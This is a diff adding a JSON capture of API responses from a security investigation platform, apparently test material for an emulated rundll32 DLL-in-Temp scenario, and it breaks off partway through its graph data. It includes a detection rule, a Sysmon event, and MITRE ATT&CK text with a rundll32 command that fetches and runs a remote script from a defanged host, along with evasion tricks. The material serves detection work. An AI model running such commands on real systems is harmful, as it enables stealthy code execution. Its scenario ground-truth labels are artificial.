@@ -1,0 +1,2528 @@
+{
+  "started_at": "2026-09-21T10:26:10.790915+00:00",
+  "phase": "inputs",
+  "origin": "https://agentcraft-investigation-dev.greensand-416301ba.australiaeast.azurecontainerapps.io",
+  "package_sha256": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+  "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+  "responses": {
+    "cases": {
+      "path": "/api/cyber/public/cases?partition=scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+      "status": 200,
+      "sha256": "3b6f1161eff9652c6414596558b9cc9101db544d6e02cf19d4b7546d4206297f",
+      "bytes": 1599,
+      "seconds": 1.04019176,
+      "retrieved_at": "2026-09-21T10:26:11.831142+00:00",
+      "body": [
+        {
+          "alarm_refs": [
+            "alarm-d190df5ee1d9c776316551f06e8a3e025ccfe999440f45a9990d63faeb9af2d8"
+          ],
+          "derived": true,
+          "event_refs": [
+            "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+            "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+          ],
+          "ground_truth_kind": "emulation_scenario",
+          "id": "incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+          "kind": "incident",
+          "knowledge_refs": [
+            "situation_type:T1218.011"
+          ],
+          "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+          "resource_id": "incident://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+          "scenario_narrative": "Generated datasets for rundll32 dll in temp in attack range.",
+          "source": {
+            "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+            "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+            "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+            "source_id": "splunk-attack-data",
+            "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+            "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+          },
+          "title": "Attack Range rundll32 DLL in Temp emulation",
+          "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+          "_rid": "7WsMANMFVoMBAAAAAAAAAA==",
+          "_self": "dbs/7WsMAA==/colls/7WsMANMFVoM=/docs/7WsMANMFVoMBAAAAAAAAAA==/",
+          "_etag": "\"010088dd-0000-1a00-0000-6aafd6820000\"",
+          "_attachments": "attachments/",
+          "_ts": 1789908610
+        }
+      ]
+    },
+    "alarms": {
+      "path": "/api/cyber/public/alarms?partition=scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61&case_id=incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+      "status": 200,
+      "sha256": "14cc88c4963a3d8b657c2aee54ec8d0498ac755273fa74910b4ba0e0765786e3",
+      "bytes": 1637,
+      "seconds": 1.152860569,
+      "retrieved_at": "2026-09-21T10:26:12.984196+00:00",
+      "body": [
+        {
+          "classification": "suspicious-pattern-not-malicious-ground-truth",
+          "derived": true,
+          "event_refs": [
+            "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+            "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+          ],
+          "id": "alarm-d190df5ee1d9c776316551f06e8a3e025ccfe999440f45a9990d63faeb9af2d8",
+          "incident_id": "incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+          "kind": "alarm",
+          "knowledge_refs": [
+            "situation_type:T1218.011"
+          ],
+          "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+          "resource_id": "alarm://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/rundll32-temp-dll-v1",
+          "rule_description": "Sysmon EventID 1: rundll32.exe with a DLL path beneath temp/tmp in CommandLine",
+          "rule_version": "rundll32-temp-dll-v1",
+          "source": {
+            "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+            "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+            "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+            "source_id": "splunk-attack-data",
+            "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+            "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+          },
+          "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+          "_rid": "7WsMANMFVoMCAAAAAAAAAA==",
+          "_self": "dbs/7WsMAA==/colls/7WsMANMFVoM=/docs/7WsMANMFVoMCAAAAAAAAAA==/",
+          "_etag": "\"010089dd-0000-1a00-0000-6aafd6830000\"",
+          "_attachments": "attachments/",
+          "_ts": 1789908611
+        }
+      ]
+    },
+    "technique": {
+      "path": "/api/cyber/knowledge/type/T1218.011",
+      "status": 200,
+      "sha256": "c77e17fa00f55bd2b3418705e8c87b34ba11ee05f260b340ade97f04f3df9c5e",
+      "bytes": 9612,
+      "seconds": 1.084266469,
+      "retrieved_at": "2026-09-21T10:26:14.068735+00:00",
+      "body": {
+        "advisory_only": true,
+        "attack_url": "https://attack.mitre.org/techniques/T1218/011",
+        "behaviour_class": [
+          "defense-evasion"
+        ],
+        "body": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
+        "commit": "b4c5d044bf5a5f117ec241b2536c8cb709f53cdc",
+        "content": "Rundll32\nAdversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
+        "definition": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
+        "doc_id": "T1218.011",
+        "doc_kind": "situation_type",
+        "doc_type": "technique",
+        "family": "attack-pattern",
+        "id": "situation_type_T1218_011-5917f545",
+        "keywords": [],
+        "license": "MITRE-ATTACK-2025",
+        "license_sha256": "d67e295e4a569b59ca0f728cadf99103b07680c5a9ecff302e1ee3c4ad289e06",
+        "log_sources": [],
+        "maturity": "",
+        "modified": "2025-10-24T17:48:20.567Z",
+        "native_id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+        "path": "enterprise-attack/enterprise-attack.json",
+        "platforms": [
+          "Windows"
+        ],
+        "release": "v18.0",
+        "retrieved_at": "2026-09-20T10:41:40.461125+00:00",
+        "source": "mitre-attack",
+        "source_sha256": "ff94838b09edfe7d59eec1cd7af0a1e229c4bc0ae0bdfa98ad170aeec9c3e272",
+        "summary": "",
+        "symptoms": [],
+        "technique_ids": [
+          "T1218.011"
+        ],
+        "title": "Rundll32",
+        "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+        "type_id": "T1218.011",
+        "label": "Rundll32"
+      }
+    },
+    "event-1": {
+      "path": "/api/cyber/public/evidence?partition=scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61&resource_id=event%3A%2F%2Fscenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61%2F1",
+      "status": 200,
+      "sha256": "9a38088913bf2bf9ab9c81667a55d453a4e0716d0008d91bc8e0d2b317aae37a",
+      "bytes": 3150,
+      "seconds": 0.807385035,
+      "retrieved_at": "2026-09-21T10:26:14.876289+00:00",
+      "body": [
+        {
+          "byte_length": 2037,
+          "byte_offset": 0,
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "entity_refs": {
+            "domain": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+            "host": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "parent_process": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "process": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "user": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+          },
+          "event_id": "1",
+          "event_record_id": "62359",
+          "fields": {
+            "CommandLine": "rundll32.exe  C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\tmp12345.dll,MessageBoxThread",
+            "Company": "Microsoft Corporation",
+            "CurrentDirectory": "C:\\Temp\\test\\",
+            "Description": "Windows host process (Rundll32)",
+            "FileVersion": "10.0.14393.4169 (rs1_release.210107-1130)",
+            "Hashes": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "IntegrityLevel": "High",
+            "LogonGuid": "{E4B49A97-9495-6888-9179-410000000000}",
+            "LogonId": "0x417991",
+            "OriginalFileName": "RUNDLL32.EXE",
+            "ParentCommandLine": "\"cmd.exe\" /s /k pushd \"C:\\Temp\\test\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentProcessGuid": "{E4B49A97-9749-6888-5A01-00000000F103}",
+            "ParentProcessId": "6124",
+            "ParentUser": "ATTACKRANGE\\Administrator",
+            "ProcessGuid": "{E4B49A97-9768-6888-5F01-00000000F103}",
+            "ProcessId": "5668",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "RuleName": "-",
+            "TerminalSessionId": "2",
+            "User": "ATTACKRANGE\\Administrator",
+            "UtcTime": "2025-07-29 09:42:00.174"
+          },
+          "host": "ar-win-dc.attackrange.local",
+          "id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+          "kind": "event",
+          "label_status": "unlabelled",
+          "ordinal": 1,
+          "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+          "provider": "Microsoft-Windows-Sysmon",
+          "raw_sha256": "eb01dc7db07099b26375cb1ca052229c7b73afea5179d06a97514d59b094b3ac",
+          "resource_id": "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+          "source": {
+            "byte_length": 2037,
+            "byte_offset": 0,
+            "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+            "ordinal": 1,
+            "raw_sha256": "eb01dc7db07099b26375cb1ca052229c7b73afea5179d06a97514d59b094b3ac",
+            "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+            "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+            "source_id": "splunk-attack-data",
+            "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+            "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+          },
+          "timestamp": "2025-07-29T09:42:00.175712200Z",
+          "transform_version": "public-windows-v1",
+          "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+          "_rid": "7WsMANMFVoMDAAAAAAAAAA==",
+          "_self": "dbs/7WsMAA==/colls/7WsMANMFVoM=/docs/7WsMANMFVoMDAAAAAAAAAA==/",
+          "_etag": "\"01008add-0000-1a00-0000-6aafd6830000\"",
+          "_attachments": "attachments/",
+          "_ts": 1789908611
+        }
+      ]
+    },
+    "graph-host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e": {
+      "path": "/api/cyber/graph/node?id=host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+      "status": 200,
+      "sha256": "4150c2b835ddff4cc20bb6a834b58e32aeda166180cab2a679c134e7a7937bbf",
+      "bytes": 18667,
+      "seconds": 1.721189802,
+      "retrieved_at": "2026-09-21T10:26:16.597673+00:00",
+      "body": {
+        "nodes": [
+          {
+            "id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "label": "Event",
+            "name": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "label": "Host",
+            "name": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "label": "Process",
+            "name": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "process_creation"
+              ],
+              "process_guid": "e4b49a97-9768-6888-5f01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "label": "Process",
+            "name": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "parent_field_reference"
+              ],
+              "process_guid": "e4b49a97-9749-6888-5a01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "label": "Event",
+            "name": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "label": "Process",
+            "name": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "process_creation"
+              ],
+              "process_guid": "e4b49a97-9761-6888-5c01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          }
+        ],
+        "edges": [
+          {
+            "id": "edge-b9a04ef6c97813a59750119d7672f61457ddb450ff3cc58c4e7312148dcba394",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-40238d364e99eaabd4674aa8cb9e7c956d3c51c648b529e71a0da13b5ae9c121",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
